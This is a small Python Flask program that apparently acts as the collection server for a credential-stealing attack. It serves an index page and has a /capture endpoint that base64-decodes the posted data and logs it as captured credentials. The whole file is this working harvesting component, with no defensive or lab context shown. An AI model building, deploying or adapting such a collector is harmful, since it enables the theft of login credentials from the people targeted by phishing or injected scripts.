from base64 import b64decode

from flask import Flask, render_template, request

app = Flask(__name__)


@app.route('/', methods=['GET'])
def index():
    return render_template("index.html")


@app.route("/capture", methods=["POST"])
def login():
    try:
        data = request.get_data(as_text=True)
        creds = b64decode(data)
        app.logger.critical("=== Got credentials ===")
        app.logger.critical(creds.decode())
    except:
        app.logger.warn("Failed to decode payload")
    return "OK"


if __name__ == '__main__':
    app.run(debug=True)
